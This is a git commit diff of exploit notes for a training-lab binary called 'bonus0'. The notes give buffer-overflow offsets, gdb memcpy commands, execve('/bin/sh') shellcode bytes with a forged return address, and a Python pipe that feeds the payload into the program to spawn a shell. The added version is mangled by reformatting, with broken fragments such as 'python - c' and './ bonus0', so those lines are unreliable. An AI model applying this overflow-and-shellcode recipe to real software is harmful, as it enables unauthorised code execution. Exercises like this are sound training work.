910838a8feecf325919cb5d880bd42824f02725e
xbaudhuin <x.baudhuin2@gmail.com>
2025-04-25 22:03:57 +0200

    push

--- bonus0/source.c
+++ bonus0/source.c
@@ -49,31 +49,47 @@ strcpy() = > buf = var1 + var2 +
                     '\n' buf : var1 + var2 +
                                ' ' + var2 = 58 buf : 20 + 19 + ' ' + 19 = 59
 
+    buf =
+        var1 + var2 + ' ' +
+        var2
 
-buf = var1+var2+ ' '+ var2
+        buf_main =
+            var1 + var2(overflow var1) +
 
+                call memcpy((void *)0xbfffe600, "01234567890123456789\n",
+                            21) SHELLCODE 20 call
+                    memcpy((void *)0xbfffe650, "AAAABBBBCCCCDDDDEEE\n", 20) SHEL
+                    / GARBAGE /
+                    ADRE
 
+                    call memcpy((void *)0xbfffe650, "AAAABBBBCCCCDDDDEFF\n", 20)
 
-call memcpy((void *)0xbfffe600, "01234567890123456789\n", 21)
-                                  SHELLCODE 20
-call memcpy((void *)0xbfffe650, "AAAABBBBCCCCDDDDEEE\n", 20)
-                                 SHEL/GARBAGE  /ADRE 
+                        call
+                    memcpy((void *)0xbfffe680,
+                           "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+                           "\x6e\x89\xe3\x50\x53\x89\xe1\x99\n",
+                           21)
 
-call memcpy((void *)0xbfffe650, "AAAABBBBCCCCDDDDEFF\n", 20)
+                        a
+                    *
+                    10 call memcpy((void *)0xbfffe680,
+                                   "\xb0\x0b\xcd\x80\x44\x44\x44\x44\x44\x44"
+                                   "\x44\x44\x44\x44\x06\xf7\xff\xbf\x44\n",
+                                   20)
 
-call memcpy((void*)0xbfffe680, "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\n", 21)
+                        0xbffff706 x
+                    /
+                    60bx 0xbffff6d6
 
-a*10
-call memcpy((void*)0xbfffe680, "\xb0\x0b\xcd\x80\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x06\xf7\xff\xbf\x44\n", 20)
+                    (python -
+                         c 'import sys; sys.stdout.write("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\n")';
+                     python -
+                     c 'import sys; sys.stdout.write("\xb0\x0b\xcd\x80\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x06\xf7\xff\xbf\x44\n")';
+                     cat) |
+                ./ bonus0
 
-0xbffff706
-  x/60bx 0xbffff6d6
-
-
-
-(python -c 'import sys; sys.stdout.write("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\n")';  python -c 'import sys; sys.stdout.write("\xb0\x0b\xcd\x80\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x06\xf7\xff\xbf\x44\n")';  cat) | ./bonus0
-
-
-0xbffff686 = main_buff
-0xbfffe600 = p buffer
-call memcpy((void*)0xbfffe600, "\xb0\x0b\xcd\x80\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x98\xf8\xff\xbf\x44\n", 20)
+                    0xbffff686 = main_buff 0xbfffe600 = p buffer call
+    memcpy((void *)0xbfffe600,
+           "\xb0\x0b\xcd\x80\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x98\xf8"
+           "\xff\xbf\x44\n",
+           20)
